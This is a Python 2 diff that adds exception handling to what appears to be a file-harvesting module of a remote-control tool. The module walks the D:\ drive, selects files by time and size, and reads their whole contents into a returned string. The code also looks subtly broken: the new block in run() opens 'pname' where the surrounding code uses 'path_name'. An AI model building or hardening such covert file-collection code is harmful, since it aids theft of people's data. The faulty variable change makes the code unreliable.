@@ -27,7 +27,11 @@ def is_dir(name):
 	if name=="$RECYCLE.BIN":
 		return
 	path_name="D:\\"+name
-	files=os.listdir(path_name)
+	try:
+		files=os.listdir(path_name)
+	except Exception,e:
+		print Exception,":",e
+		return
 	print str(files)
 	for i in range(0,len(files)):
 		pname =path_name+'\\'+files[i] #绝对路径名
@@ -35,10 +39,15 @@ def is_dir(name):
 		if os.path.isdir(pname)==False:
 			if judgetime(pname)==True and judgesize(pname)==True:
 				ans.append(files[i])
-				fp=open(pname,'rb')
-				content=fp.read()
-				fp.close()
-				ans.append(str(content))
+				try:
+					fp=open(pname,'rb')
+					content=fp.read()
+					fp.close()
+					ans.append(str(content))
+				except Exception,e:
+					print Exception,":",e
+					return 
+
 
 def run(**args):
 	print "[*] In file_return module. "
@@ -57,9 +66,12 @@ def run(**args):
 		if os.path.isdir(path_name)==False:
 			if judgetime(path_name) and judgesize(path_name):
 				ans.append(files[i])
-				fp=open(path_name,'rb')
-				content=fp.read()
-				fp.close()
-				ans.append(str(content))
+				try:
+					fp=open(pname,'rb')
+					content=fp.read()
+					fp.close()
+					ans.append(str(content))
+				except Exception,e:
+					print Exception,":",e
 
 	return str(ans)
